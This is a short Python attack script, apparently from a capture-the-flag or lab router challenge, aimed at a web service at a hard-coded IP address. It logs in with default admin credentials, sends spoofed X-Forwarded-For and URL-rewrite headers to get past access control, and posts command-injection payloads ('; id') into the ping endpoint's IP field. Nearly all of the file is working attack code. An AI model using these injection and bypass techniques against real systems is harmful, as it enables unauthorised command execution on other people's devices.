#!/usr/bin/env python3
import requests

URL = "http://154.57.164.66:30817"
AUTH = ("admin", "router123")

# Check current state
print("=== Current config state ===")
r = requests.get(f"{URL}/configs", auth=AUTH, timeout=5)
print("Current configs:")
# Parse config names from HTML
import re
configs = re.findall(r'Config <code>([^<]+)</code>', r.text)
for cfg in configs:
    print(f"  - {cfg}")

# Check if there's a way to interact with the server binary
# Look for environment variables or startup flags
print("\n=== Trying special headers ===")
headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Original-URL": "/admin/ping",
    "X-Rewrite-URL": "/admin/ping",
}
r = requests.post(f"{URL}/admin/ping", auth=AUTH, data={"ip": "; id"}, headers=headers, timeout=5)
print(f"Status: {r.status_code} - {r.text[:100]}")

# Try to access the ping endpoint directly
print("\n=== Direct POST to ping ===")
r = requests.post(f"{URL}/admin/ping", auth=AUTH, data={"ip": "127.0.0.1; id"}, timeout=5)
print(f"Status: {r.status_code}")
if "401" not in r.text:
    print(r.text[:300])